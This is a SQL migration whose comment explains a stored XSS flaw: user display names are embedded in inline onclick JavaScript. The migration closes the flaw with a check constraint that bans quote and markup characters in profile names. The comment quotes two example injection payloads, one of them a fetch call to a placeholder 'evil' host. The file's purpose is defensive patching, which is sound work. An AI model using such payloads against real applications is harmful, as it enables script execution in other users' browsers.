-- HIGH: display names (profiles.name) are embedded directly into inline
-- onclick="...openTeamMember('<name>')..." JS-string-literal arguments in
-- dozens of places throughout the client (avatar chips, mentions,
-- delegation notifications, search results, etc.). HTML-escaping the
-- *rendered text* doesn't protect this case: browsers decode HTML
-- entities in an attribute's value before treating it as JS source, so
-- even an HTML-escaped quote character still breaks out of the JS
-- string once decoded. A name like  x" onmouseover="alert(1)  or
-- x'); fetch('https://evil...  would inject a new attribute or
-- statement into every avatar/mention/notification referencing that
-- person, executing in any teammate's browser who sees it.
--
-- Rather than rewrite every one of those call sites, close it at the
-- source: names legitimately never need <, >, ", ', \, or a backtick.
-- Blocking those characters on write removes the injection primitive
-- everywhere at once. Client-side validation mirrors this so users get
-- an immediate, friendly error instead of a silent DB rejection.
alter table profiles add constraint profiles_name_no_html_chars
  check (name !~ '[<>"''\\`]');
